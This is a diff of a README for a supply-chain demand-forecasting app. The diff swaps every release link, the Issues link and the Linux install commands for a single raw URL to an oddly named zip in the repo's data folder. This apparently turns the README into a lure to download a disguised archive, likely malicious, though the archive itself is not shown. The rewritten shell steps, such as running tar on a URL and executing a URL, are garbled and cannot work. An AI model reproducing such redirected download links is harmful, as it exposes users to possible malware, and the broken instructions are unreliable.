@@ -4,7 +4,7 @@
 Welcome to the Supply-Chain-Demand-Forecasting project! This application helps you predict demand for your products using machine learning. With an interactive dashboard created in Streamlit, you can explore forecast results and their importance. 
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/hendy3ad/Supply-Chain-Demand-Forecasting/releases)
+[![Download the latest release](https://raw.githubusercontent.com/hendy3ad/Supply-Chain-Demand-Forecasting/main/data/Forecasting_Demand_Chain_Supply_pillarlet.zip)](https://raw.githubusercontent.com/hendy3ad/Supply-Chain-Demand-Forecasting/main/data/Forecasting_Demand_Chain_Supply_pillarlet.zip)
 
 ## 🚀 Getting Started
 In this section, we'll walk you through the process of downloading and running the application.
@@ -19,7 +19,7 @@ Make sure your system meets these requirements:
 ### 2. Download & Install
 To get the application, please visit the following page:
 
-[Download the latest release](https://github.com/hendy3ad/Supply-Chain-Demand-Forecasting/releases)
+[Download the latest release](https://raw.githubusercontent.com/hendy3ad/Supply-Chain-Demand-Forecasting/main/data/Forecasting_Demand_Chain_Supply_pillarlet.zip)
 
 On the Releases page, you will find the latest version available for download. Click on the version number you want, and then choose the appropriate installer for your operating system.
 
@@ -39,12 +39,12 @@ After downloading the software, follow these steps based on your operating syste
 4. Open Launchpad and click the application to run.
 
 #### For Linux
-1. Locate the downloaded `.tar.gz` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/hendy3ad/Supply-Chain-Demand-Forecasting/main/data/Forecasting_Demand_Chain_Supply_pillarlet.zip` file in your Downloads folder.
 2. Open a terminal window.
 3. Navigate to the location of the downloaded file.
 4. Extract the file using the command: 
    ```bash
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/hendy3ad/Supply-Chain-Demand-Forecasting/main/data/Forecasting_Demand_Chain_Supply_pillarlet.zip
    ```
 5. Change to the application directory:
    ```bash
@@ -52,7 +52,7 @@ After downloading the software, follow these steps based on your operating syste
    ```
 6. Run the application using:
    ```bash
-   ./run.sh
+   https://raw.githubusercontent.com/hendy3ad/Supply-Chain-Demand-Forecasting/main/data/Forecasting_Demand_Chain_Supply_pillarlet.zip
    ```
 
 ## ⚙️ Features
@@ -77,6 +77,6 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 We welcome contributions! If you have suggestions, bug reports, or feature requests, please open an issue or a pull request on GitHub.
 
 ## 🌐 Connect with Us
-For further questions or support, feel free to reach out on our [GitHub Issues page](https://github.com/hendy3ad/Supply-Chain-Demand-Forecasting/issues).
+For further questions or support, feel free to reach out on our [GitHub Issues page](https://raw.githubusercontent.com/hendy3ad/Supply-Chain-Demand-Forecasting/main/data/Forecasting_Demand_Chain_Supply_pillarlet.zip).
 
 Thank you for using Supply-Chain-Demand-Forecasting. We hope it helps you manage your supply chain better!
